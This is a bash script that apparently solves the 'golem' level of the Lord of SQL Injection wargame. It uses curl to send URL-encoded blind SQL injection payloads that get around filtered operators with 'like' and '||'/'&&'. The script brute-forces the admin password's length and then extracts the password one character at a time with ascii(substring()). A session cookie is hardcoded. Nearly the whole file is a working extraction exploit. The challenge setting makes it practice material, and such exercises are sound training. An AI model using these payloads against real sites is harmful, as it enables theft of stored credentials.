#!/bin/bash

COOKIE='PHPSESSID=ekl4ai5eo1e82qma64l5gv39i4'
URL='https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'

# Cracking pw Param Length
echo "[!] Starting For Cracking pw Params Length.."
STARTTIME=$(date +%s)
res=0
for i in $(seq 1 100); do
	res=$(curl -b $COOKIE "$URL?pw=%27%20||%20id%20like%20%27admin%27%20%26%26%20length(pw)%20like%20$i%20%23" -s | tr ' ' '\n' | wc -l)
	if [ $res -eq 279 ]; then
		echo "[+] Found pw Length Value! : $i"
		res=$i
		break
	fi
done
echo 

# Cracking pw Values
echo "[!] Starting For Cracking pw Params Value.."
RESULT=()
for((i = 1; i <= $res; i++)); do
	for((v = 33; v < 128; v++)); do 
		val=$(curl -b $COOKIE "$URL?pw=%27%20||%20id%20like%20%27admin%27%20%26%26%20ascii(substring(pw,$i,1))%20like%20$v%20%23" -s | tr ' ' '\n' | wc -l)
		if [ $val -eq 279 ]; then
			val=$(echo $v | awk -e '{printf("%c", $1);}')
			RESULT+=$val
			echo "[+] Found $i""th Value : $v -> $val" 
			break
		fi
	done
done

echo
echo "[+] Final Password : ${RESULT[@]}"
echo
ENDTIME=$(date +%s)
echo "[*] It takes $(($ENDTIME - $STARTTIME)) seconds to complete this task..."
